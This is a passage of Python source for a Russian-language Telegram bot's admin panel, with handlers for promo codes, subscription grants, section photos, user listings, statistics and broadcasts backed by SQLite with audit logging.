    register_user(message.from_user)
    await message.answer(
        framed("🛠 ПАНЕЛЬ АДМИНИСТРАТОРА", "Выбери нужное действие ниже."),
        reply_markup=admin_keyboard(),
        parse_mode="HTML",
    )


@dp.callback_query(F.data.startswith("admin:"))
@admin_only
async def admin_actions(callback: CallbackQuery, state: FSMContext):
    if callback.from_user.id not in ADMIN_IDS:
        await callback.answer("Нет доступа.", show_alert=True)
        return

    action = callback.data.split(":", 1)[1]
    if action == "photos":
        await state.clear()
        await callback.message.answer(
            framed("🖼 УПРАВЛЕНИЕ ФОТО", "Выбери раздел, для которого нужно установить, заменить или удалить изображение."),
            parse_mode="HTML", reply_markup=photo_sections_keyboard(),
        )

    elif action == "promo":
        await state.clear()
        await state.set_state(AdminStates.waiting_promo)
        await callback.message.answer(framed("🎟️ СОЗДАНИЕ ПРОМОКОДА", "Отправьте: <code>КОД ДНИ ЛИМИТ</code>\nПример: <code>WELCOME30 30 10</code>\nОтмена: /cancel"), parse_mode="HTML")

    elif action == "broadcast":
        await state.clear()
        await state.set_state(AdminStates.waiting_broadcast)
        await callback.message.answer(
            framed("📨 РАССЫЛКА", "Отправь текст одним сообщением. Для отмены: /cancel"),
            parse_mode="HTML",
        )

    elif action == "subscription":
        await state.clear()
        await state.set_state(AdminStates.waiting_subscription)
        await callback.message.answer(
            framed(
                "⭐ УПРАВЛЕНИЕ ПОДПИСКОЙ",
                "Отправь данные в формате:\n<code>ID ДНИ</code>\n\n"
                "Примеры:\n"
                "<code>123456789 30</code> — выдать на 30 дней\n"
                "<code>123456789 unlim</code> — безлимит\n"
                "<code>123456789 0</code> — снять подписку\n\n"
                "Для отмены: /cancel",
            ),
            parse_mode="HTML",
        )

    elif action == "users":
        with connect_db() as con:
            rows = con.execute("""
                SELECT u.user_id, u.first_name, u.username, s.expires_at, s.user_id AS sub_uid
                FROM users u LEFT JOIN subscriptions s ON s.user_id=u.user_id
                ORDER BY u.created_at DESC LIMIT 30
            """).fetchall()

        if not rows:
            body = "Пока нет зарегистрированных пользователей."
        else:
            lines = []
            for row in rows:
                name = escape(row["first_name"] or "Без имени")
                username = f" (@{escape(row['username'])})" if row["username"] else ""
                if row["expires_at"] is None:
                    sub = "♾️ безлимит" if row["sub_uid"] is not None else "нет подписки"
                else:
                    try:
                        exp = datetime.fromisoformat(row["expires_at"])
                        sub = "⭐ до " + exp.strftime("%d.%m.%Y")
                        if exp <= datetime.now(timezone.utc):
                            sub = "⌛ истекла"
                    except ValueError:
                        sub = "неизвестно"
                lines.append(f"• <code>{row['user_id']}</code> — {name}{username}\n  {sub}")
            body = "\n\n".join(lines)
        await callback.message.answer(
            framed("👥 ПОСЛЕДНИЕ ПОЛЬЗОВАТЕЛИ", body),
            parse_mode="HTML",
            reply_markup=admin_keyboard(),
        )

    elif action == "stats":
        with connect_db() as con:
            users_count = con.execute("SELECT COUNT(*) FROM users").fetchone()[0]
            offers_count = con.execute("SELECT COUNT(*) FROM offers").fetchone()[0]
            active_subs = con.execute("""
                SELECT COUNT(*) FROM subscriptions
                WHERE expires_at IS NULL OR expires_at > ?
            """, (datetime.now(timezone.utc).isoformat(),)).fetchone()[0]
        await callback.message.answer(
            framed(
                "📊 СТАТИСТИКА",
                f"Пользователей: <b>{users_count}</b>\n"
                f"Офферов: <b>{offers_count}</b>\n"
                f"Активных подписок: <b>{active_subs}</b>",
            ),
            parse_mode="HTML",
            reply_markup=admin_keyboard(),
        )

    await callback.answer()


@dp.callback_query(F.data.startswith("photo:"))
@admin_only
async def photo_actions(callback: CallbackQuery, state: FSMContext):
    if callback.from_user.id not in ADMIN_IDS:
        await callback.answer("Нет доступа.", show_alert=True)
        return
    parts = callback.data.split(":")
    action = parts[1] if len(parts) > 1 else ""
    if action == "back":
        await state.clear()
        await callback.message.answer("🛠 Админ-панель", reply_markup=admin_keyboard())
    elif len(parts) == 3 and parts[2] in PHOTO_SECTIONS:
        section = parts[2]
        if action == "select":
            current = "установлено" if photo_for(section) else "не установлено"
            kb = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="📷 Добавить / заменить", callback_data=f"photo:set:{section}")],
                [InlineKeyboardButton(text="🗑 Удалить", callback_data=f"photo:delete:{section}")],
                [InlineKeyboardButton(text="◀️ К разделам", callback_data="photo:list")],
            ])
            await callback.message.answer(
                framed(PHOTO_SECTIONS[section], f"Фото: {current}. Выбери действие."),
                parse_mode="HTML", reply_markup=kb)
        elif action == "set":
            await state.set_state(AdminStates.waiting_photo)
            await state.update_data(photo_section=section)
            await callback.message.answer(
                f"📷 Отправь фотографию для раздела «{PHOTO_SECTIONS[section]}» обычным фото Telegram. Отмена: /cancel")
        elif action == "delete":
            with connect_db() as con:
                con.execute("DELETE FROM section_photos WHERE section=?", (section,))
                con.execute("INSERT INTO admin_audit(actor_id,action,details) VALUES (?,?,?)", (callback.from_user.id, "photo_deleted", section))
            await callback.message.answer("🗑 Фото удалено.", reply_markup=photo_sections_keyboard())
    elif action == "list":
        await state.clear()
        await callback.message.answer("🖼 Выбери раздел:", reply_markup=photo_sections_keyboard())
    await callback.answer()


@dp.message(AdminStates.waiting_promo)
@admin_only
async def create_promo(message: Message, state: FSMContext):
    if not message.from_user or message.from_user.id not in ADMIN_IDS:
        return
    parts = (message.text or "").strip().upper().split()
    if len(parts) != 3 or not re.fullmatch(r"[A-Z0-9_-]{3,32}", parts[0]) or not parts[1].isdigit() or not parts[2].isdigit() or not (1 <= int(parts[1]) <= 3650) or not (1 <= int(parts[2]) <= 100000):
        await message.answer("Формат: КОД ДНИ ЛИМИТ, например WELCOME30 30 10")
        return
    with connect_db() as con:
        exists = con.execute("SELECT 1 FROM promo_codes WHERE code=?", (parts[0],)).fetchone()
        if exists:
            await message.answer("Такой промокод уже существует.")
            return
        con.execute("INSERT INTO promo_codes(code,days,max_uses) VALUES (?,?,?)", (parts[0], int(parts[1]), int(parts[2])))
        con.execute("INSERT INTO admin_audit(actor_id,action,details) VALUES (?,?,?)", (message.from_user.id, "promo_created", parts[0]))
    await state.clear()
    await message.answer("✅ Промокод создан: " + parts[0], reply_markup=admin_keyboard())


@dp.message(AdminStates.waiting_photo)
@admin_only
async def save_section_photo(message: Message, state: FSMContext):
    if not message.from_user or message.from_user.id not in ADMIN_IDS:
        return
    if not message.photo:
        await message.answer("Отправь изображение как фото Telegram (не файл), либо /cancel.")
        return
    data = await state.get_data()
    section = data.get("photo_section")
    if section not in PHOTO_SECTIONS:
        await state.clear()
        await message.answer("Раздел не выбран. Открой /admin заново.")
        return
    file_id = message.photo[-1].file_id
    with connect_db() as con:
        con.execute("""INSERT INTO section_photos(section, file_id) VALUES (?, ?)
            ON CONFLICT(section) DO UPDATE SET file_id=excluded.file_id, updated_at=CURRENT_TIMESTAMP""",
            (section, file_id))
        con.execute("INSERT INTO admin_audit(actor_id,action,details) VALUES (?,?,?)", (message.from_user.id, "photo_updated", section))
    await state.clear()
    await message.answer(
        framed("✅ ФОТО СОХРАНЕНО", f"Раздел: {escape(PHOTO_SECTIONS[section])}\nИзображение будет показываться в подключённых экранах."),
        parse_mode="HTML", reply_markup=photo_sections_keyboard())


@dp.message(Command("cancel"))
@admin_only
async def cancel_admin_action(message: Message, state: FSMContext):
    if message.from_user and message.from_user.id in ADMIN_IDS:
        await state.clear()
        await message.answer(
            framed("↩️ ОТМЕНЕНО", "Действие отменено."),
            reply_markup=admin_keyboard(),
            parse_mode="HTML",
        )


@dp.message(AdminStates.waiting_subscription)
@admin_only
async def grant_subscription(message: Message, state: FSMContext):
    if not message.from_user or message.from_user.id not in ADMIN_IDS:
        return

    parts = (message.text or "").strip().split()
    if len(parts) != 2 or not parts[0].isdigit():
        await message.answer(
            "Неверный формат. Нужно: <code>ID ДНИ</code>, например <code>123456789 unlim</code>.",
            parse_mode="HTML",
        )
        return

    user_id = int(parts[0])
    duration = parts[1].lower()
    if user_id <= 0:
        await message.answer("Укажи корректный Telegram ID.")
        return

    if duration == "0":
        with connect_db() as con:
            con.execute("DELETE FROM subscriptions WHERE user_id=?", (user_id,))
            con.execute("INSERT INTO admin_audit(actor_id,action,target_id,details) VALUES (?,?,?,?)", (message.from_user.id, "subscription_change", user_id, "0"))
        await state.clear()
        try:
            await bot.send_message(
                user_id,
                framed("❌ ПОДПИСКА ОТМЕНЕНА", "Администратор снял твою подписку."),
                parse_mode="HTML",
            )
        except TelegramAPIError:
            pass
        await message.answer(
            framed("✅ ГОТОВО", f"Подписка пользователя <code>{user_id}</code> снята."),
            reply_markup=admin_keyboard(),
            parse_mode="HTML",
        )
        return

    if duration == "unlim":
        expires_at = None
        duration_label = "без ограничений по времени"
    elif duration.isdigit() and 1 <= int(duration) <= 3650:
        days = int(duration)
        expires_at = (datetime.now(timezone.utc) + timedelta(days=days)).isoformat()
        duration_label = f"на {days} дн."
    else:
        await message.answer(
            "Укажи положительное число дней, <code>unlim</code> или <code>0</code>.",
            parse_mode="HTML",
        )
        return

    with connect_db() as con:
        con.execute("""
            INSERT INTO subscriptions(user_id, expires_at, granted_by)
            VALUES (?, ?, ?)
            ON CONFLICT(user_id) DO UPDATE SET
                expires_at=excluded.expires_at,
                granted_by=excluded.granted_by,
                updated_at=CURRENT_TIMESTAMP
        """, (user_id, expires_at, message.from_user.id))
        con.execute("INSERT INTO admin_audit(actor_id,action,target_id,details) VALUES (?,?,?,?)", (message.from_user.id, "subscription_change", user_id, duration))

    await state.clear()
    try:
        await bot.send_message(
            user_id,
            framed("⭐ ПОДПИСКА АКТИВИРОВАНА", f"Тебе выдана подписка: <b>{duration_label}</b>."),
            parse_mode="HTML",
        )
    except TelegramAPIError:
        pass

    await message.answer(
        framed("✅ ПОДПИСКА ВЫДАНА", f"Пользователь: <code>{user_id}</code>\nСрок: <b>{duration_label}</b>"),
        reply_markup=admin_keyboard(),
        parse_mode="HTML",
    )


@dp.message(AdminStates.waiting_broadcast)
@admin_only
async def broadcast_message(message: Message, state: FSMContext):
    if not message.from_user or message.from_user.id not in ADMIN_IDS:
        return
    if not message.text or len(message.text) > 2000:
        await message.answer("Отправь текст рассылки длиной 1–2000 символов или /cancel.")
        return

    with connect_db() as con:
        ids = [row[0] for row in con.execute("SELECT user_id FROM users").fetchall()]
        con.execute("INSERT INTO admin_audit(actor_id,action,details) VALUES (?,?,?)",
                    (message.from_user.id, "broadcast", f"recipients={len(ids)} chars={len(message.text)}"))

    sent = failed = 0
    for user_id in ids:
        try:
            await bot.send_message(
                user_id,
                framed("📢 СООБЩЕНИЕ ОТ АДМИНИСТРАЦИИ", escape(message.text)),
                parse_mode="HTML",
            )
            sent += 1
        except TelegramRetryAfter as exc:
            await asyncio.sleep(min(exc.retry_after + 1, 60))
            try:
                await bot.send_message(user_id, framed("📢 СООБЩЕНИЕ ОТ АДМИНИСТРАЦИИ", escape(message.text)), parse_mode="HTML")
                sent += 1
            except TelegramAPIError:
                failed += 1
        except TelegramAPIError:
            failed += 1
        await asyncio.sleep(0.06)

    await state.clear()
    await message.answer(
        framed("📨 РАССЫЛКА ЗАВЕРШЕНА", f"Доставлено: <b>{sent}</b>\nНе доставлено: <b>{failed}</b>"),
        reply_markup=admin_keyboard(),
        parse_mode="HTML",
    )


async def main():
    init_db()
    await dp.start_polling(
        bot,
        allowed_updates=[
            "message",
            "callback_query",
            "business_connection",
            "business_message",
        ],
    )


if __name__ == "__main__":
    asyncio.run(main())
